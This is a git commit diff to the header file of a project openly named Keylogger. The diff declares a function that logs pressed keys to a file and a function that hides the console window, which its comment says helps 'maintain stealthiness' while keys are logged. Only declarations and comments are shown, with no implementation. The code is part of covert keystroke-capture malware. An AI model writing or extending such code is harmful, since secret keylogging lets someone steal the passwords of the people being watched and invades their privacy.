708e21c4a2ffccf8bf4a1bba3662fcbc207b2c6e
Ami Cahalon <tnhh952@gmail.com>
2023-08-21 01:37:04 +0300

    feat: use hook

--- Keylogger/keyLogger.h
+++ Keylogger/keyLogger.h
@@ -1,56 +1,24 @@
+/**
+ * @file keylogger.h
+ * @brief Header file for a basic keylogger implementation.
+ */
+
 #pragma once
-#include <stdio.h>
-#include <Windows.h>
+
+ /**
+  * @brief Log pressed keys to a file.
+  *
+  * Captures and logs pressed keys to a specified file.
+  *
+  * @param outFileName The name of the output file to log keys.
+  * @return An error code indicating the success or failure of the operation.
+  */
+errno_t logKeys(const char* outFileName);
 
 /**
-* @file keyLogger.h
-*/
-
-/**
- * The code for the key 0
- */
-#define VK_0 0x30
-
-/**
- * The code for the key 9
- */
-#define VK_9 0x39
-
-/**
- * The code for the key 'A'
- */
-#define VK_A 0x41
-
-/**
- * The code for the key 'Z'
- */
-#define VK_Z 0x5A
-
-/**
- * The minimum time difference between two clicks.
- */
-#define INTERVAL 130
-
-/**
- * The maximum length for a string that represents a button, for example "[CAPS LOCK]".
- */
-#define MAX_KEY_CONTEXT_LEN 15
-
-/**
- * A type that represents a key
- */
-typedef unsigned short key_t;
-
-/**
- * Tracks the user clicks, writes maximumKeys keys into the file outFileName.
+ * @brief Hide the console window.
  *
- * @param outFileName The name of the file to which the characters will be written.
- * @param maximumKeys The maximum number of characters to write to the file.
- * @return The error code of opening a file.
- */
-errno_t logKeys(const char *outFileName, const size_t maximumKeys);
-
-/**
- * Hides the black console window.
+ * This function hides the console window to prevent its visibility during
+ * the keylogging process. This can help maintain stealthiness.
  */
 void hideConsoleWindow(void);
